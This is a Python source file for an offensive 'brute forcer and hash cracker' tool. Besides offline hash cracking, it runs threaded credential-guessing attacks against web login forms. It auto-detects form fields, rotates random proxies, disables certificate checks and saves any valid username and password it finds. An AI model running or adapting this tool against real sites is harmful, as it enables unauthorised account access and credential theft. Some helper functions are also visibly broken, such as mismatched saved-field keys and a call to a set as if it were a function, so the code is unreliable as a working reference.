import hashlib
import time
import termcolor
import logging
import colorlog
import re
import requests
import threading
import os
import json
import random
from tqdm import tqdm
from urllib.parse import urlparse
from bs4 import BeautifulSoup


DEFAULTS_FILE = "defaults.json"

handler = colorlog.StreamHandler()
handler.setFormatter(colorlog.ColoredFormatter(
    "%(log_color)s[%(asctime)s] %(levelname)s: %(message)s",
    datefmt='%H:%M:%S',
    log_colors={
        "DEBUG": "cyan",
        "INFO": "green",
        "WARNING": "yellow",
        "ERROR": "red",
        "CRITICAL": "red"
    }
))

logger = colorlog.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)


def print_logo():
    logo = r"""
    __ ____   ____    __ __  _        ____       ___ ___  ____ __ __ _____ 
   /  |    \ /    |  /  |  |/ ]      /    |     |   |   |/    |  |  |     |
  /  /|  D  |  o  | /  /|  ' / _____|  o  |_____| _   _ |  o  |  |  |__/  |
 /  / |    /|     |/  / |    \|     |     |     |  \_/  |     |  |  |   __|
/   \_|    \|  _  /   \_|     |_____|  _  |_____|   |   |  _  |  :  |  /  |
\     |  .  |  |  \     |  .  |     |  |  |     |   |   |  |  |     |     |
 \____|__|\_|__|__|\____|__|\_|     |__|__|     |___|___|__|__|\__,_|_____|
    """
    print(termcolor.colored((logo), "green"))
    print(termcolor.colored(("Brute Forcer, Hash Identifier & Hash Cracker"), "red"))
    print(termcolor.colored(("https://github.com/mauzware"), "red"))
    print(termcolor.colored(("Created by mauzware"), "red"))



def load_hashes(file_path):
    """Loads hashes from a file into a list"""

    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]
    

def crack_hashes(hash_file, wordlist_file, algorithm, stop_after_first=False, save_option=False):
    """Function for cracking hashes"""

    target_hashes = load_hashes(hash_file)
    cracked_hashes = {}
    attempts = 0

    start_time = time.time()

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            total_words = sum(1 for _ in f) #Count total words for progress bar
            f.seek(0) #Rewind to beginning of the file

            for word in tqdm(f, total=total_words, desc="Cracking Hashes", unit="word"):
                word = word.strip()
                if not word:
                    continue

                attempts += 1

                h = hashlib.new(algorithm)
                h.update(word.encode('utf-8'))
                hashed_word = h.hexdigest()

                if hashed_word in target_hashes:
                    cracked_hashes[hashed_word] = word
                    logger.info(f"✅ Match found! {hashed_word} => {word}")
                    
                    if stop_after_first:
                        break

    except FileNotFoundError:
        logger.error("❌ Wordlist file not found!")
        return {}

    except ValueError:
        logger.error(f"❗️ Invalid hash algorithm: {algorithm}")
        return {}
    
    end_time = time.time()
    duration = round(end_time - start_time, 2)

    logger.info(f"\n🎉 Cracking finished in {duration} seconds")
    logger.info(f"🌐 Total attempts: {attempts}")
    logger.info(f"✅ Matches found: {len(cracked_hashes)}")

    
    if save_option:
        output_path = input(termcolor.colored(("📁 Enter the location for output file (e.g., results.txt): "), "green")).strip()
        with open(output_path, 'w', encoding='utf-8') as f:
            for hash_val, word in cracked_hashes.items():
                f.write(f"{hash_val} => {word}\n")

        logger.info(f"✅ Results save to {output_path}")

    if not cracked_hashes:
        logger.warning("❌ No matches found.")

    return cracked_hashes


def identify_hash(hash_str):
    """Simple hash identifier based on length"""

    length = len(hash_str)
    candidates = {
        32: ["md5"],
        40: ["sha1"],
        56: ["sha224"],
        64: ["sha256", "blake2s"],
        96: ["sha384"],
        128: ["sha512", "blake2b"]
        #SHA-3 series and others can have similar lengths but less common
    }

    possible = candidates.get(length, ["Unknown"])
    logger.info(f"🔍 Hash length: {length}")
    logger.info(f"✅ Possible hash algorithm(s): {', '.join(possible)}")
    return possible


def _is_url(value: str) -> bool:
    """Checking if given string is a valid HTTP/HTTPS URL"""

    return isinstance(value, str) and re.match(r"^https?://([a-zA-Z0-9.-]+|\d{1,3}(?:\.\d{1,3}){3})(:\d+)?(?:/.*)?$", value.strip()) is not None


def _normalize_url(value: str) -> str:
    """Ensure URL has proper scheme and format, auto-fix missing http"""
    
    if not value:
        return None
    
    value = value.strip().lower()

    #if no scheme is present, default to http
    if not value.startswith("http://") and not value.startswith("https://"):
        value = "http://" + value

    return value if _is_url(value) else None


def auto_detect_login_fields(url, proxies=None):
    """Attempts to auto-detect login form field names"""

    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        if not forms:
            logger.warning("❌ No forms found on page.")
            return None, None
        
        form = forms[0] #Assume first form is login form
        inputs = form.find_all('input')

        username_field = None
        password_field = None

        for inp in inputs:
            name = inp.get('name', '')
            if not name:
                continue #skip inputs without a name

            name = name.lower()
            type_ = inp.get('type', '').lower()

            if "user" in name or "email" in name:
                username_field = inp.get('name')

            if "pass" in name or type_ == "password":
                password_field = inp.get('name')

        logger.info(f"🔍 Detected fields - Username: {username_field}, Password: {password_field}")
        return username_field, password_field
    
    except Exception as e:
        logger.error(f"❌ Error auto-detecting fields: {e}")
        return None, None
    

def _is_valid_login(response):
    """Checks for successfull/failed login response"""

    if not hasattr(response, "status_code"):
        logger.warning("Response object is not a valid requests.Response")
        return False
    
    response_text = response.text.lower()

    valid_keywords = [
        "welcome", "logged in", "dashboard", "logout", "you have logged in", "profile", "account", "manage"
    ]
    
    """"
    fail_keywords = [
        "invalid", "incorrect", "wrong", "failed", "login failed", "denied", "access denied", "bad credentials", "bad username", "bad password", 
        "wrong credentials", "wrong username", "wrong password", "invalid credentials", "invalid username", "invalid password", "incorrect credentials",
        "incorrect username", "incorrect password", "invalid credentials", "invalid username", "invalid password", "authentication failed", "try again",
        "form action=\"login.php\""
    ]"""


    #strong signal of success
    if any(keyword in response_text for keyword in valid_keywords) and response.status_code == 200 and "login.php" not in response.url:
        return True
    
    #no clear indication - assume failed
    return False


def load_proxies(proxy_file):
    """Load proxies from a text file, each line like ip:port"""

    proxies_list = []
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    proxies_list.append({
                        "http": f"http://{proxy}",
                        "https": f"https://{proxy}"
                    })

        if proxies_list:
            logger.info(f"🌐 Loaded {len(proxies_list)} proxies.")
            return proxies_list
        
        else:
            logger.warning("⚠️ Proxy file was empty.")
            return None
        
    except FileNotFoundError:
        logger.error("❌ Proxy file not found. Continuing without proxies.")
        return None
    

def brute_force(url, user_file, pw_file, mode, max_threads=20, rate_limit=0.5, proxy_mode=None, proxies_list=None):
    """Brute forcing method"""

    usernames = []
    passwords = []
    url = _normalize_url(url)

    if not url:
        logger.error("❗️ Invalid or empty URL provided.")
        return
    
    server_errors = 0
    error_threshold = 5 #after 5 server errors in a row, slow down
    parsed_url = urlparse(url)
    domain = parsed_url.netloc

    #First try to load saved fields
    saved_fields = load_save_fields()
    if domain in saved_fields:
        username_field = saved_fields[domain]["Username"]
        password_field = saved_fields[domain]["Password"]
        logger.info(f"Using saved fields for {domain}: {username_field} / {password_field}")

    else:
        username_field, password_field = auto_detect_login_fields(url)

        if not username_field or not password_field:
            logger.error("⚠️ Auto-detect failed. Please input field names manually.")
            username_field = input(termcolor.colored(("📝 Enter username field name: "), "cyan")).strip()
            password_field = input(termcolor.colored(("📝 Enter password field name: "), "cyan")).strip()

        #Save them for future
        save_fields(domain, username_field, password_field)

    with open(user_file, 'r', encoding='utf-8') as f:
        usernames = [line.strip() for line in f if line.strip()]	

    with open(pw_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]

    attempt_counter = 0
    attempt_lock = threading.Lock()
    total_combinations = len(usernames) * len(passwords)
    logger.info(f"🔍 Total combinations to try: {total_combinations}")

    def try_login(u, p):

        nonlocal server_errors, rate_limit, proxies_list, attempt_counter #allow modifications inside inner function
        
        proxy_to_use = None
        

        if proxy_mode == "burp":
            proxy_to_use = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

        elif proxy_mode == "list" and proxies_list:
            proxy_to_use = random.choice(proxies_list)

        try:

            session = requests.Session()

            """
            this is for the future CSRF token support, add "user_token": token to data

            #GET login page to grab CSRF token
            login_url = url
            login_page = session.get(url, timeout=10, proxies=proxy_to_use, verify=False)
            logger.debug(f"DEBUG: Login Page Snippet:\n{login_page.text[:1000]}")
            token = None
            match = re.search(r'<input[^>]*name=["\']user_token["\'][^>]*value=["\']([^"\']+)["\']', login_page.text, re.IGNORECASE)
            token = match.group(1) if match else None
            
            if not token:
                logger.warning("CSRF token not found on login page!")
                logger.debug(f"DEBUG: Raw login page snippet:\n{login_page.text[:1000]}")
                return False
            """

            data = {username_field: u, password_field: p, "Login": "Login"}

            #POST credentials with token
            response = session.post(url, data=data, timeout=10, proxies=proxy_to_use, verify=False)
            

        except requests.RequestException as e:
            logger.error(f"❌ Request failed for {u}:{p} - {e}")
            server_errors += 1
            return False
        
        #handle server errors
        if response.status_code in [400, 403, 405, 429, 500, 503]:
            server_errors += 1
            logger.warning(f"⚠️ Server responded with {response.status_code} for {u}:{p}")

            if server_errors >= error_threshold:
                rate_limit += 0.5 #slow down
                server_errors = 0 #reset counter
                logger.warning(f"🐢 Auto-slow activated: new rate limit {rate_limit} seconds")

        else:
            server_errors = 0 #reset on good response
        

        if _is_valid_login(response):
            logger.info(f"✅ Found valid credentials: {u}:{p}")
            logger.info(f"🌐 Response Status Code: {response.status_code}")
            logger.info(f"🌐 Response URL: {response.url}")
            logger.info(f"📜 Response Snippet:\n{response.text[:500]}")

            #Save to dict_hits.txt
            with open("dict_hits.txt", 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]{url} => Username: {u} | Password: {p}\n")

            return True

        else:
            with attempt_lock:
                attempt_counter += 1
                if attempt_counter % 100 == 0:
                    percentage_done = (attempt_counter / total_combinations) * 100
                    logger.info(f"🔍 Tried {attempt_counter}/{total_combinations} combinations ({percentage_done:.2f}% done)...")
            return False
    
        
    threads = []

    for u in usernames:
        for p in passwords:
    
            if mode == "slow": #no threading
                try_login(u, p)
                time.sleep(rate_limit)

            elif mode == "standard": #wait after each attempt (slow but threaded)
                t = threading.Thread(target=try_login, args=(u, p))
                t.start()
                t.join()
                time.sleep(rate_limit)

            elif mode == "fast": #multiple threads at a time
                while threading.active_count() > max_threads:
                    time.sleep(0.1) #wait if too many threads are active

                t = threading.Thread(target=try_login, args=(u, p))
                t.start()
                threads.append(t)
                time.sleep(rate_limit)

    if mode == "fast": #wait for all threads to finish
        for t in threads:
            t.join()

    logger.info(f"✅ Brute-force complete. Total attempts: {attempt_counter}")


def load_save_fields():
    """Load saved field names from fields.json if it exists"""

    if os.path.exists("fields.json"):
        try:
            with open("fields.json", 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if not content:
                    return {}
                
                return json.load(f)
            
        except json.JSONDecodeError:
            logger.error("Invalid JSON in fields.json. Ignoring contents.")
            return {}

    return {}


def save_fields(domain, username_field, password_field):
    """Save field names to field.json"""

    fields = load_save_fields()
    fields[domain] = {"username": username_field, "password": password_field}
    with open("fields.json", 'w', encoding='utf-8') as f:
        json.dump(fields, f, indent=4)
        logger.info(f"💾 Saved login field names for {domain} to fields.json")



def load_rainbow_table(file_path):
    """Brute force using rainbow table"""

    rainbow_table = {}

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    hash_value, plain_text = line.split(":", 1)
                    rainbow_table[hash_value.strip()] = plain_text.strip()

    except FileNotFoundError:
        logger.error(f"❌ Rainbow table file not found: {file_path}")

    return rainbow_table

def hash_password(password, algorithm):
    """Hash -> Password
    Assume 'rainbow_table' is already loaded and 'password_candidate' is the password you are trying to try
    """

    available_algos = sorted(hashlib.algorithms_guaranteed)
    logger.info(f"🌐 Available algorithms: {', '.join(available_algos)}")
    algorithm = input(termcolor.colored(("📁 Enter the hash algorithm used (e.g., md5, sha256, sha512): "), "green")).lower().strip()

    if algorithm not in available_algos:
        logger.error(f"❗️ Invalid algorithm '{algorithm}'! Please choose from the available algorithms.")
        return

    else:
        return hashlib.algorithms_guaranteed(password.encode()).hexdigest()


def rainbow_attack(url, username, rainbow_path, mode, rate_limit=0.5, max_threads=20, proxy_mode=None, proxies_list=None):
    """Brute Force with rainbow table"""

    url = _normalize_url(url)

    if not url:
        logger.error("❗️ Invalid or empty URL provided.")
        return
    
    rainbow_table = load_rainbow_table(rainbow_path)
    server_errors = 0
    error_threshold = 5 #after 5 server errors in a row, slow down

    if not rainbow_table:
        logger.error("❗️ Failed to load rainbow table.")
        return
    
    password_candidates = list(rainbow_table.values())

    def try_rainbow_logic(password_candidate):
        nonlocal server_errors, rate_limit, proxies_list
        proxy_to_use = None
        payload = {
                "username": username,
                "password": password_candidate,
                "Login": "Login"
            }
        

        if proxy_mode == "burp":
            proxy_to_use = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080" }

        elif proxy_mode == "list" and proxies_list:
            proxy_to_use = random.choice(proxies_list)

        try:

            session = requests.Session()
            response = session.post(url, data=payload, timeout=10, proxies=proxy_to_use, verify=False, allow_redirects=True)
            

        except requests.RequestException as e:
            logger.error(f"❌ Request failed for {username}:{password_candidate} - {e}")
            server_errors += 1
            return False
        
        if response.status_code in [400, 403, 405, 429, 500, 503]:
            server_errors += 1
            logger.warning(f"⚠️ Server responded with {response.status_code} for {username}:{password_candidate}")

            if server_errors >= error_threshold:
                rate_limit += 0.5 #slow down
                server_errors = 0 #reset counter
                logger.warning(f"🐢 Auto-slow activated: new rate limit {rate_limit} seconds")

        else:
            server_errors = 0 #reset on good response


        if _is_valid_login(response):
            logger.info(f"✅ Password FOUND --> {password_candidate}")
            logger.info(f"🌐 Response Status Code: {response.status_code}")
            logger.info(f"🌐 Response URL: {response.url}")
            logger.info(f"📜 Response Snippet: \n{response.text[:500]}")

            #Save to rainbow_hits.txt
            with open("rainbow_hits.txt", 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]{url} => Username: {username} | Password: {password_candidate}\n")

            return True

        else:
            logger.info(f"🔍 Attempted: {username}:{password_candidate}")
            return False
        
    
    threads = []

    for password_candidate in tqdm(password_candidates, desc="Rainbow Attack", unit="password"):
        if mode == "slow": #no threading
            try_rainbow_logic(password_candidate)
            time.sleep(rate_limit)

        elif mode == "standard": #wait after each attempt (slow but threaded)
            t = threading.Thread(target=try_rainbow_logic, args=(password_candidate,))
            t.start()
            t.join()
            time.sleep(rate_limit)

        elif mode == "fast": #multiple threads at a time
            while threading.active_count() > max_threads:
                time.sleep(0.1) #wait if too many threads are active

            t = threading.Thread(target=try_rainbow_logic, args=(password_candidate,))
            t.start()
            threads.append(t)
            time.sleep(rate_limit)

    if mode == "fast": #wait for all threads to finish
        for t in threads:
            t.join()


def save_defaults(data):
    with open(DEFAULTS_FILE, 'w') as f:
        json.dump(data, f)


def load_defaults():
    try:
        with open(DEFAULTS_FILE, 'r') as f:
            return json.load(f)
        
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    

def ask_int(prompt, default):
    """Ask for an integer with a default fallback"""

    try:
        return int(input(termcolor.colored((prompt), "green")).strip() or str(default))
    
    except ValueError:
        logger.warning(f"❗️ Invalid input. Using default {default}.")
        return default
    

def ask_float(prompt, default):
    """Ask for an float with a default fallback"""

    try:
        return float(input(termcolor.colored((prompt), "green")).strip() or str(default))
    
    except ValueError:
        logger.warning(f"❗️ Invalid input. Using default {default}.")
        return default


def ask_choice(prompt, choices, default):
    """Ask for a choice from a list with a default fallback"""

    value = input(termcolor.colored((prompt), "green")).strip().lower()
    if value not in choices:
        logger.warning(f"❗️ Invalid choice. Using default {default}.")
        return default
    
    return value



def main_function():
    """Main program interface with user function"""

    while True:
        print_logo()
        print(termcolor.colored(("\n======= CRACK A MAUZ TOOL MENU =======\n"), "cyan"))
        print(termcolor.colored(("[1] Identify Hash"), "yellow"))
        print(termcolor.colored(("[2] Crack Hashes"), "yellow"))
        print(termcolor.colored(("[3] Brute Force - Dictionary Attack"), "yellow"))
        print(termcolor.colored(("[4] Brute Force - Rainbow Table Attack"), "yellow"))
        print(termcolor.colored(("[0] Exit"), "yellow"))

        choice = input(termcolor.colored(("\n🌐 Choose an option (0, 1, 2, 3 or 4): "), "green")).strip()

        if choice == "1":

            hash_str = input(termcolor.colored(("\n🌐 Enter the hash value to identify: "), "green")).strip()
            if not hash_str:
                logging.error("❗️ Empty input!")
                continue
            
            identify_hash(hash_str)


        elif choice == "2":

            hash_file = input(termcolor.colored(("📁 Enter the path to the hash file: "), "green"))
            wordlist_file = input(termcolor.colored(("📁 Enter the path to the wordlist file (e.g., rockyou.txt): "), "green")).strip()

            available_algos = sorted(hashlib.algorithms_guaranteed)
            logger.info(f"🌐 Available algorithms: {', '.join(available_algos)}")
            algorithm = input(termcolor.colored(("📁 Enter the hash algorithm used (e.g., md5, sha256, sha512): "), "green")).lower().strip()

            if algorithm not in available_algos:
                logger.error(f"❗️ Invalid algorithm '{algorithm}'! Please choose from the available algorithms.")
                continue
            
            stop_option = input(termcolor.colored(("🌐 Stop after first match? (y/n): "), "green")).lower().strip()
            stop_after_first = stop_option == "y"

            saving_option = input(termcolor.colored(("✉️  Do you want to save the results (y/n): "), "green")).lower().strip()
            save_option = saving_option == "y"

            crack_hashes(hash_file, wordlist_file, algorithm, stop_after_first=stop_after_first, save_option=save_option)


        elif choice == "3":

            url = input(termcolor.colored(("🌐 Enter login page that you want to Brute Force: "), "green")).strip()
            user_file = input(termcolor.colored(("📁 Enter username wordlist for Brute Forcing (e.g., usernames.txt): "), "green")).strip()
            pw_file = input(termcolor.colored(("📁 Enter passwords wordlist for Brute Forcing (e.g., passwords.txt): "), "green")).strip()

            mode = ask_choice("🚀 Choose brute force speed - slow / standard / fast: ", ["slow", "standard", "fast"], "slow")
            max_threads = ask_int("🕰️ Max threads (default 20): ", 20)
            rate_limit = ask_float("🕰️ Rate limit between requests in seconds (default 0.5): ", 0.5)
            use_proxy_input = ask_choice("🌐 Use proxy? (y/n): ", ["y", "n"], "n")
            use_proxy = use_proxy_input == "y"
            proxy_mode = None
            proxies_list = None

            if use_proxy:
                proxy_choice = ask_choice("🌐 Proxy mode - burp / list: ", ["burp", "list"], "burp")
                 
                if proxy_choice == "list":
                    proxy_file = input(termcolor.colored(("📁 Enter proxy list file path: "), "green")).lower().strip()
                    proxies_list = load_proxies(proxy_file)

                proxy_mode = proxy_choice

            brute_force(url, user_file, pw_file, mode, max_threads=max_threads, rate_limit=rate_limit, proxy_mode=proxy_mode, proxies_list=proxies_list)


        elif choice == "4":

            url = input(termcolor.colored(("🌐 Enter target URL: "), "green")).strip()
            username = input(termcolor.colored(("📝 Enter username to attack: "), "green")).strip()
            rainbow_path = input(termcolor.colored(("📁 Enter path to rainbow table file: "), "green")).strip()

            defaults = load_defaults()
            max_threads = ask_int(f"🕰️ Max threads (default {defaults.get('max_threads', 20)}): ", defaults.get('max_threads', 20))
            rate_limit = ask_float(f"🕰️ Rate limit (default {defaults.get('rate_limit', 0.5)}): ", defaults.get('rate_limit', 0.5))

            defaults.update({"rate_limit": rate_limit, "max_threads": max_threads})
            save_defaults(defaults)

            mode = ask_choice("🚀 Choose Rainbow Attack speed - slow / standard / fast: ", ["slow", "standard", "fast"], "slow")

            use_proxy_input = ask_choice("🌐 Use a proxy? (y/n): ", ["y", "n"], "n") 
            use_proxy = use_proxy_input == "y"
            proxy_mode = None
            proxies_list = None
            
            if use_proxy:
                proxy_choice = ask_choice("🌐 Proxy mode - burp / list: ", ["burp", "list"], "burp") 

                if proxy_choice == "list":
                    proxy_file = input(termcolor.colored(("📁 Enter proxy list file path: "), "green")).lower().strip()
                    proxies_list = load_proxies(proxy_file)

                proxy_mode = proxy_choice

            rainbow_attack(
                url, username, rainbow_path,
                mode, max_threads=max_threads, rate_limit=rate_limit, 
                proxy_mode=proxy_mode, proxies_list=proxies_list
                )


        elif choice == "0":

            logger.info("👋 Exiting... Stay safe out there! 👋")
            break

        else:
            logger.warning("❗️ Invalid choice. Please enter option 0, 1, 2, 3 or 4.")

    
try:
    main_function()

except Exception as e:
    logger.critical(f"❌ Unexpected error occurred: {e}", exc_info=True)		
